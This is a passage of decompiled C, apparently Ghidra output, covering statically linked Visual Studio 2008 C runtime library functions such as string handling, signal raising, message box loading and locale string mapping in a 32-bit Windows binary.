      }
LAB_00413bec:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2008 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2008 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2008 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __fputwc_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __fputwc_nolock(wchar_t _Ch,FILE *_File)

{
  int *piVar1;
  wint_t wVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  errno_t eVar6;
  int local_14;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    iVar3 = __fileno(_File);
    if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
      puVar5 = &DAT_00422d78;
    }
    else {
      iVar3 = __fileno(_File);
      uVar4 = __fileno(_File);
      puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00424fe0)[iVar3 >> 5]);
    }
    if ((puVar5[0x24] & 0x7f) != 2) {
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_00422d78;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00424fe0)[iVar3 >> 5]);
      }
      if ((puVar5[0x24] & 0x7f) != 1) {
        iVar3 = __fileno(_File);
        if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
          puVar5 = &DAT_00422d78;
        }
        else {
          iVar3 = __fileno(_File);
          uVar4 = __fileno(_File);
          puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00424fe0)[iVar3 >> 5]);
        }
        if ((puVar5[4] & 0x80) != 0) {
          eVar6 = _wctomb_s(&local_14,local_10,5,_Ch);
          if ((eVar6 == 0) && (iVar3 = 0, 0 < local_14)) {
            do {
              piVar1 = &_File->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar4 = __flsbuf((int)local_10[iVar3],_File);
              }
              else {
                *_File->_ptr = local_10[iVar3];
                uVar4 = (uint)(byte)*_File->_ptr;
                _File->_ptr = _File->_ptr + 1;
              }
            } while ((uVar4 != 0xffffffff) && (iVar3 = iVar3 + 1, iVar3 < local_14));
          }
          goto LAB_00413ec3;
        }
      }
    }
  }
  piVar1 = &_File->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    __flswbuf((uint)(ushort)_Ch,_File);
  }
  else {
    *(wchar_t *)_File->_ptr = _Ch;
    _File->_ptr = _File->_ptr + 2;
  }
LAB_00413ec3:
  wVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar2;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2008 Release

void __initp_misc_cfltcvt_tab(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  do {
    piVar1 = (int *)((int)&PTR_LAB_00422de0 + uVar3);
    iVar2 = __encode_pointer(*piVar1);
    uVar3 = uVar3 + 4;
    *piVar1 = iVar2;
  } while (uVar3 < 0x28);
  return;
}



// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_00423ec0 == (DAT_00422040 | 1));
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00413f73;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00413f73:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



// Library Function - Single Match
//  void __cdecl unexpected(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl unexpected(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_00423ec4);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __initp_eh_hooks
// 
// Library: Visual Studio 2008 Release

void __initp_eh_hooks(void)

{
  DAT_00423ec4 = __encode_pointer(0x413f9b);
  return;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2008 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_00423ec8 = param_1;
  DAT_00423ecc = param_1;
  DAT_00423ed0 = param_1;
  DAT_00423ed4 = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2008 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_00422d74 * 0xc + param_3);
  if ((DAT_00422d74 * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_sigabrt
// 
// Library: Visual Studio 2008 Release

_PHNDLR __cdecl ___get_sigabrt(void)

{
  _PHNDLR p_Var1;
  
  p_Var1 = (_PHNDLR)__decode_pointer(DAT_00423ed0);
  return p_Var1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2008 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  code *pcVar3;
  int iVar4;
  code *pcVar5;
  undefined4 extraout_ECX;
  code **ppcVar6;
  _ptiddata p_Var7;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var7 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar6 = (code **)&DAT_00423ec8;
        iVar4 = DAT_00423ec8;
        goto LAB_00414147;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_00414125;
        if (_SigNum != 8) goto LAB_00414109;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var7->_pxcptacttab);
    ppcVar6 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar6;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar6 = (code **)&DAT_00423ed4;
      iVar4 = DAT_00423ed4;
    }
    else if (_SigNum == 0x15) {
      ppcVar6 = (code **)&DAT_00423ecc;
      iVar4 = DAT_00423ecc;
    }
    else {
      if (_SigNum != 0x16) {
LAB_00414109:
        piVar2 = __errno();
        *piVar2 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return -1;
      }
LAB_00414125:
      ppcVar6 = (code **)&DAT_00423ed0;
      iVar4 = DAT_00423ed0;
    }
LAB_00414147:
    local_20 = 1;
    pcVar3 = (code *)__decode_pointer(iVar4);
  }
  iVar4 = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    iVar4 = __exit(3);
  }
  if (local_20 != iVar4) {
    __lock(iVar4);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_004141ab;
    }
  }
  else {
LAB_004141ab:
    if (_SigNum == 8) {
      for (local_28 = DAT_00422d68; local_28 < DAT_00422d6c + DAT_00422d68; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var7->_pxcptacttab) = 0;
      }
      goto LAB_004141e5;
    }
  }
  pcVar5 = (code *)__encoded_null();
  *ppcVar6 = pcVar5;
LAB_004141e5:
  FUN_00414206();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var7->_tfpecode = local_34;
  }
  return 0;
}



void FUN_00414206(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0040e64c(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00414242(undefined4 param_1)

{
  _DAT_00423edc = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00414251(undefined4 param_1)

{
  _DAT_00423ee8 = param_1;
  return;
}



// Library Function - Single Match
//  ___crtMessageBoxA
// 
// Library: Visual Studio 2008 Release

int __cdecl ___crtMessageBoxA(LPCSTR _LpText,LPCSTR _LpCaption,UINT _UType)

{
  int iVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  undefined local_18 [8];
  byte local_10;
  undefined local_c [4];
  int local_8;
  
  iVar1 = __encoded_null();
  local_8 = 0;
  if (DAT_00423eec == 0) {
    hModule = LoadLibraryA(s_USER32_DLL_0041cc00);
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    pFVar2 = GetProcAddress(hModule,s_MessageBoxA_0041cbf4);
    if (pFVar2 == (FARPROC)0x0) {
      return 0;
    }
    DAT_00423eec = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetActiveWindow_0041cbe4);
    DAT_00423ef0 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetLastActivePopup_0041cbd0);
    DAT_00423ef4 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetUserObjectInformationA_0041cbb4);
    DAT_00423efc = __encode_pointer((int)pFVar2);
    if (DAT_00423efc != 0) {
      pFVar2 = GetProcAddress(hModule,s_GetProcessWindowStation_0041cb9c);
      DAT_00423ef8 = __encode_pointer((int)pFVar2);
    }
  }
  if ((DAT_00423ef8 != iVar1) && (DAT_00423efc != iVar1)) {
    pcVar3 = (code *)__decode_pointer(DAT_00423ef8);
    pcVar4 = (code *)__decode_pointer(DAT_00423efc);
    if (((pcVar3 != (code *)0x0) && (pcVar4 != (code *)0x0)) &&
       (((iVar5 = (*pcVar3)(), iVar5 == 0 ||
         (iVar5 = (*pcVar4)(iVar5,1,local_18,0xc,local_c), iVar5 == 0)) || ((local_10 & 1) == 0))))
    {
      _UType = _UType | 0x200000;
      goto LAB_004143a2;
    }
  }
  if ((((DAT_00423ef0 != iVar1) &&
       (pcVar3 = (code *)__decode_pointer(DAT_00423ef0), pcVar3 != (code *)0x0)) &&
      (local_8 = (*pcVar3)(), local_8 != 0)) &&
     ((DAT_00423ef4 != iVar1 &&
      (pcVar3 = (code *)__decode_pointer(DAT_00423ef4), pcVar3 != (code *)0x0)))) {
    local_8 = (*pcVar3)(local_8);
  }
LAB_004143a2:
  pcVar3 = (code *)__decode_pointer(DAT_00423eec);
  if (pcVar3 == (code *)0x0) {
    return 0;
  }
  iVar1 = (*pcVar3)(local_8,_LpText,_LpCaption,_UType);
  return iVar1;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        do {
          cVar1 = *_Src;
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_004143eb;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_004143eb:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _strncpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  rsize_t rVar4;
  errno_t eVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
    }
    else {
LAB_00414463:
      if (_SizeInBytes != 0) {
        if (_MaxCount == 0) {
          *_Dst = '\0';
          return 0;
        }
        if (_Src != (char *)0x0) {
          pcVar3 = _Dst;
          rVar4 = _SizeInBytes;
          if (_MaxCount == 0xffffffff) {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if (cVar1 == '\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if ((cVar1 == '\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pcVar3 = '\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInBytes - 1] = '\0';
            return 0x50;
          }
          *_Dst = '\0';
          piVar2 = __errno();
          eVar5 = 0x22;
          *piVar2 = 0x22;
          goto LAB_00414474;
        }
        *_Dst = '\0';
      }
    }
  }
  else if (_Dst != (char *)0x0) goto LAB_00414463;
  piVar2 = __errno();
  eVar5 = 0x16;
  *piVar2 = 0x16;
LAB_00414474:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar5;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_error_mode(int _Mode)

{
  int *piVar1;
  int iVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar2 = DAT_00423478;
      DAT_00423478 = _Mode;
      return iVar2;
    }
    if (_Mode == 3) {
      return DAT_00423478;
    }
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_00423f04;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_00423f00;
    do {
      piVar2 = piVar1;
      if (DAT_00423f04 == (int *)0x0) goto LAB_00414581;
      piVar1 = DAT_00423f04;
    } while (*DAT_00423f04 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_00423f04[1];
    _free(_Memory);
LAB_00414581:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_004145a4();
  return;
}



void FUN_004145a4(void)

{
  FUN_0040e64c(0xe);
  return;
}



// Library Function - Single Match
//  _strcmp
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_004145f4;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_004145c0;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_004145f4;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_004145f4;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_004145c0:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_004145f4:
  return (uint)bVar5 * -2 + 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  size_t sVar2;
  uint uVar3;
  size_t local_20;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    sVar2 = 0xffffffff;
  }
  else {
    if (DAT_0042510c == 3) {
      __lock(4);
      uVar3 = ___sbh_find_block((int)_Memory);
      if (uVar3 != 0) {
        local_20 = *(int *)((int)_Memory + -4) - 9;
      }
      FUN_004146d2();
      if (uVar3 != 0) {
        return local_20;
      }
    }
    sVar2 = HeapSize(DAT_004237bc,0,_Memory);
  }
  return sVar2;
}



void FUN_004146d2(void)

{
  FUN_0040e64c(4);
  return;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2008 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  uint cchWideChar;
  undefined4 *puVar6;
  UINT UVar7;
  int *in_ECX;
  char *pcVar8;
  LPSTR lpMultiByteStr;
  void *local_14;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  if (DAT_00423f08 == 0) {
    iVar3 = LCMapStringW(0,0x100,(LPCWSTR)&DAT_0041cc0c,1,(LPWSTR)0x0,0);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x78) {
        DAT_00423f08 = 2;
      }
    }
    else {
      DAT_00423f08 = 1;
    }
  }
  pcVar5 = (char *)param_3;
  pcVar8 = param_4;
  if (0 < (int)param_4) {
    do {
      pcVar8 = pcVar8 + -1;
      if (*pcVar5 == '\0') goto LAB_0041476c;
      pcVar5 = pcVar5 + 1;
    } while (pcVar8 != (char *)0x0);
    pcVar8 = (char *)0xffffffff;
LAB_0041476c:
    pcVar5 = param_4 + -(int)pcVar8;
    bVar2 = (int)(pcVar5 + -1) < (int)param_4;
    param_4 = pcVar5 + -1;
    if (bVar2) {
      param_4 = pcVar5;
    }
  }
  if ((DAT_00423f08 == 2) || (DAT_00423f08 == 0)) {
    local_10 = (undefined4 *)0x0;
    local_14 = (void *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_7 == 0) {
      param_7 = *(int *)(*in_ECX + 4);
    }
    UVar7 = ___ansicp((LCID)param_1);
    if (UVar7 == 0xffffffff) goto LAB_00414a8e;
    if (UVar7 == param_7) {
      LCMapStringA((LCID)param_1,param_2,(LPCSTR)param_3,(int)param_4,(LPSTR)param_5,(int)param_6);
    }
    else {
      local_10 = (undefined4 *)
                 ___convertcp(param_7,UVar7,(char *)param_3,(uint *)&param_4,(LPSTR)0x0,0);
      if (local_10 == (undefined4 *)0x0) goto LAB_00414a8e;
      local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)0x0,0);
      if (local_c != 0) {
        if (((int)local_c < 1) || (0xffffffe0 < local_c)) {
          puVar6 = (undefined4 *)0x0;
        }
        else if (local_c + 8 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_00414a6b;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(local_c + 8);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
        if (puVar6 != (undefined4 *)0x0) {
          _memset(puVar6,0,local_c);
          local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)puVar6,
                                 local_c);
          if (local_c != 0) {
            local_14 = (void *)___convertcp(UVar7,param_7,(char *)puVar6,&local_c,(LPSTR)param_5,
                                            (int)param_6);
          }
          __freea(puVar6);
        }
      }
    }
LAB_00414a6b:
    if (local_10 != (undefined4 *)0x0) {
      _free(local_10);
    }
    if ((local_14 != (void *)0x0) && ((void *)param_5 != local_14)) {
      _free(local_14);
    }
    goto LAB_00414a8e;
  }
  if (DAT_00423f08 != 1) goto LAB_00414a8e;
  local_c = 0;
  if (param_7 == 0) {
    param_7 = *(int *)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar(param_7,(uint)(param_8 != 0) * 8 + 1,(LPCSTR)param_3,
                                    (int)param_4,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_00414a8e;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffdc;
      local_10 = (undefined4 *)&stack0xffffffdc;
      if (&stack0x00000000 != (undefined *)0x24) {
LAB_00414814:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar1);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_00414814;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_00414a8e;
  iVar3 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,(int)param_4,(LPWSTR)local_10,cchWideChar);
  if ((iVar3 != 0) &&
     (local_c = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0),
     local_c != 0)) {
    if ((param_2 & 0x400) == 0) {
      if (((int)local_c < 1) || (0xffffffe0 / local_c < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        uVar1 = local_c * 2 + 8;
        if (uVar1 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_00414924;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(uVar1);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar3 = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,
                             local_c);
        if (iVar3 != 0) {
          lpMultiByteStr = (LPSTR)param_5;
          pcVar5 = param_6;
          if (param_6 == (char *)0x0) {
            lpMultiByteStr = (LPSTR)0x0;
            pcVar5 = (char *)0x0;
          }
          local_c = WideCharToMultiByte(param_7,0,(LPCWSTR)puVar6,local_c,lpMultiByteStr,(int)pcVar5
                                        ,(LPCSTR)0x0,(LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_6 != (char *)0x0) && ((int)local_c <= (int)param_6)) {
      LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_5,(int)param_6)
      ;
    }
  }
LAB_00414924:
  __freea(local_10);
LAB_00414a8e:
  iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtLCMapStringA
